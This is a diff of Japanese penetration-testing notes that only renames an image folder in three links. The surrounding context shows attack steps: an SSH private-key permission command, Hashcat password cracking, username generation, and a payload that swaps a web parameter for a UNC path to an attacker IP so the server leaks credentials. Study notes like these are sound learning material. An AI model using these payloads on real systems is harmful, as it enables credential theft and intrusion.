@@ -61,7 +61,7 @@ chmod 600 id_rsa
 
 以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある。
 
-![](../../画像ファイル/Pasted%20image%2020250720131350.png)
+![](../../Images/Pasted%20image%2020250720131350.png)
 
 $$所用推定時間$$
 
@@ -225,7 +225,7 @@ echo "Suzuki Taro" > users.lst
 python3 username_generator.py -w users.lst
 ```
 
-![ 500](../../画像ファイル/Pasted%20image%2020230611195317.png)
+![ 500](../../Images/Pasted%20image%2020230611195317.png)
 
 $$username生成例$$
 
@@ -347,7 +347,7 @@ http://example/page=//<attacker_IP>/hoge
 \\\\<attacker_IP>\hoge\hoge.txt
 ```
 
-![](../../画像ファイル/Pasted%20image%2020250720111345.png)
+![](../../Images/Pasted%20image%2020250720111345.png)
 
 $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 
